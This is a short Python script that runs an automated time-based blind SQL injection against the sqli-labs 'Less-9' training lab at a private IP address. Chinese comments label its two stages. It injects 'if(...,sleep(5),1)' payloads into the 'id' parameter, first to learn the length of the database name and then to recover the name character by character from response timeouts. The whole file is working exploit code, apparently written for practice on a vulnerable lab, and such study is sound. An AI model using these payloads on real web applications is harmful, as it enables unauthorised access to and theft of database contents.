import requests
import string
url="http://192.168.200.148/sqli-labs-master/Less-9/"

req=requests.session()

def timeout(url,params):
    try:
        res=req.get(url=url,params=params,timeout=2)
    except:
        return("timeout")
    else:
        return(res.text)

# 确定数据库名长度
for i in range(1,51):
    params={
        'id' : f"1' and if(length(database())={i},sleep(5),1) -- "
    }
    if "timeout" in timeout(url=url,params=params):
        dbname_len=i
        break
print(f"[+] Length of The Database is {dbname_len}")

#数据库名的确定
c_set=string.printable.strip()
dbname=""
for i in range(1,dbname_len+1):
    for j in c_set:
        params={
                'id' : f"1' and if(substr(database(),{i},1)='{j}',sleep(5),1) -- "
            }
        if "timeout" in timeout(url=url,params=params):
            dbname+=j
            break
print(f"[+] name of The database is {dbname}")
